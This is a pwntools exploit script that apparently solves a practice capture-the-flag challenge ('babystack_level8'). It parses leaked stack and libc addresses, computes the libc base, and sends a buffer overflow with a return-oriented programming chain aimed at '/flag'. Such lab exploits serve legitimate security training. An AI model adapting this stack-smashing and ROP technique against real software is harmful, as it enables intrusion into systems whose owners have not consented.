#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babystack_level8
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babystack_level8')
context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def rop(base):
    pop_rdi = [base+0x23b6a, rbp]
    pop_rsi = [base+0x2601f, 0x4]
    syscall = [base+0x10db60] 
    chain = b''.join(map(p64, pop_rdi + pop_rsi + syscall))
    return chain 

# def rop(base):
#     pop_rdi = base + 0x23b6a 
#     pop_rsi = base + 0x2601f 
#     pop_rdx = base + 0x142c92 
#     pop_rax = base + 0x36174
#     syscall = base + 0x2284d
#     chain = b''.join(map(p64, pop_rdi + pop_rsi + pop_rdx + pop_rax + syscall))
#     return chain

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io.recvuntil(b'base pointer rbp: ')
rbp = int(io.recvline(keepends=False), 16)
# print(rbp+8)
io.sendline(hex(rbp+8))
io.recvuntil(b"is: ")
# leak = int(io.recvline(keepends=False), 16)
leak = io.recvline()
# print(addr_val)
io.recvuntil(b"will be stored: ")
buf = int(io.recvline(keepends=False), 16)
# print(buf)
base = int(leak[:-1],16) - 0x23f90 - 0xF3
# payload = b'a'*(rbp-buf)+b'/flag' +b'\0'*3 + rop(rbp)
print(base)
payload = b'a'*(rbp-buf)+b'/flag' +b'\0'*3 + rop(base)

io.send(payload)
io.interactive()

